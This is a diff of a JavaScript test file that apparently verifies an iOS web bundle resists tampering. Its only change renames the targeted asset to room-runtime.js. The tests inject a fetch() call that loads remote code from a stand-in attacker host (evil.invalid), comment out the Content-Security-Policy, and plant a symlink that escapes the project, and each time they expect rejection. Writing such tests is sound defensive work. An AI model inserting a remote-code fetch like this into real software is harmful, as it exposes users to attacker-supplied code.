@@ -108,11 +108,11 @@ test("CSP weakening and remote shell assets fail closed", (context) => {
   rejects(root, /reviewed bytes|CSP connect-src|weakening/u);
 
   cpSync(join(ROOT, "ios-web/index.html"), join(root, "ios-web/index.html"));
-  rewrite(root, "ios-web/shell.js", (source) => `${source}\nfetch("https://evil.invalid/code.js");\n`);
+  rewrite(root, "ios-web/room-runtime.js", (source) => `${source}\nfetch("https://evil.invalid/code.js");\n`);
   rejects(root, /reviewed bytes|remote URL/u);
 
   cpSync(join(ROOT, "ios-web/index.html"), join(root, "ios-web/index.html"));
-  cpSync(join(ROOT, "ios-web/shell.js"), join(root, "ios-web/shell.js"));
+  cpSync(join(ROOT, "ios-web/room-runtime.js"), join(root, "ios-web/room-runtime.js"));
   rewrite(root, "ios-web/index.html", (source) => source.replace(
     /(<meta\s+http-equiv="Content-Security-Policy"[\s\S]*?>)/u,
     "<!-- $1 -->",
@@ -164,7 +164,7 @@ test("symlinks and linked escape payloads fail closed without following", (conte
   const outside = join(root, "..", `outside-${Date.now()}.js`);
   context.after(() => rmSync(outside, { force: true }));
   writeFileSync(outside, "outside payload\n");
-  const shell = join(root, "ios/App/App/public/shell.js");
+  const shell = join(root, "ios/App/App/public/room-runtime.js");
   rmSync(shell);
   symlinkSync(outside, shell);
   rejects(root, /symbolic link is forbidden/u);
